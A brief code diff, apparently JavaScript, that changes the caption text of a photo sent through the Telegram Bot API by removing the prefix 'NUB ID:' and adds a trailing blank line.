@@ -31,7 +31,7 @@ Language: ${deviceInfo.language || 'Unknown'}
     await axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
       chat_id: chatId,
       photo: imageUrl,
-      caption: `NUB ID: ${messageText}`
+      caption: ` ${messageText}`
     });
 
     return {
@@ -46,3 +46,4 @@ Language: ${deviceInfo.language || 'Unknown'}
     };
   }
 }
+
